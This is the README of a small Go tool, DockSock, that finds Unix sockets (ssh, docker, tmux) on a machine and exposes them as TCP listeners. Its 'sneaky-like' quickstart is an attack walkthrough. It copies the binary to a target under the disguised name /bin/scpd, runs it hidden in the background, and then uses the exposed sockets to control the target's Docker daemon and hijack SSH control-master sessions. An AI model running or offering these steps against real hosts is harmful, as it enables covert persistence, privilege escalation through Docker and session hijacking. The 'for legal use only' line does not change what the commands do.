DockSock
========

Nifty little TCP -> Unix Socket proxy.  Meant to expose docker/ssh control
sockets to the network.

It periodically searches the entire filesystem for unix sockets and for each
one found spawns a TCP listener which will accept connections and proxy them to
the Unix socket.  The starting (i.e. lowest) port is configurable.

A regex (by default `ssh|docker|tmux|tmp`) is used to filter the sockts
exposed.  

The list of found an served sockets can be found by making a TCP connection
(e.g. with netcat) to the lowest port, which by default is `61111`.

For legal use only.

Quickstart
----------
```bash
go install github.com/magisterquis/docksock
docksock -v
```

Slightly Less Quickstart, sneaky-like
-------------------------------------
```bash
# Build the tool
go get github.com/magisterquis/docksock
go build -o docksock github.com/magisterquis/docksock

# Put it on target
scp docksock user@target:/bin/scpd
ssh user@target 'nohup /bin/scpd >/dev/null 2>&1 &'

# Give it time to find some sockets
sleep 60

# List the available sockets
nc target 61111

# Connect to something fun
docker -H target:61112 version

# Even deviouser
socat -d -d unix-listen:./s,fork tcp:target:61113 &
ssh -S ./s user@a
```
